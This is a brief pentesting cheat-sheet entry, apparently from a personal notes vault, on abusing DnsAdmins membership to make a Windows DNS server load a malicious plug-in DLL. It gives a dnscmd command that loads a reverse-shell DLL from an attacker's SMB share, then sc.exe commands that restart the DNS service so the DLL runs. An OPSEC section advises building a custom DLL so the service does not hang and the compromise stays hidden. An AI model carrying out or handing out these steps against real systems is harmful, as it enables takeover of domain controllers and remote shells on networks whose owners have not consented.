# DNSAdmins DLL
**Introduction** 
Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.  

*Requirements* 
Use-case: Remotely inject dll to dns server  
Privileges required: DNS admin  
OS: Windows server  
MITRE ATT&CK®: [T1543.003: Windows Service](https://attack.mitre.org/techniques/T1543/003/)

**Crafting a DLL** 
We can create a reverse shell DLL as described [here](obsidian://open?vault=Security%20%26%20PenTesting&file=Access%2FReverse%20Shells%2FDLL) - or see OPSEC for a stealthier technique. 

**The Attack**
To upload the DLL, we can either launch a webserver, or create a [local SMB share](obsidian://open?vault=Security%20%26%20PenTesting&file=Utils%2FNetwork%2FSMB%20Server%20-%20Impacket).

```
dnscmd.exe /config /serverlevelplugindll \\SMB_SERVER\SHARE_NAME\rev.dll
```
```
sc.exe stop \\DOMAIN dns
sc.exe start \\DOMAIN dns
```

##### OPSEC
Using just a DLL generate by MSVenom will cause the DNS service to hang, as the DLL generated isn't a valid replacement.

We could roll our own replacement using [these techniques](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)so that whatever service is using our malicious DLL will continue to start up correctly. 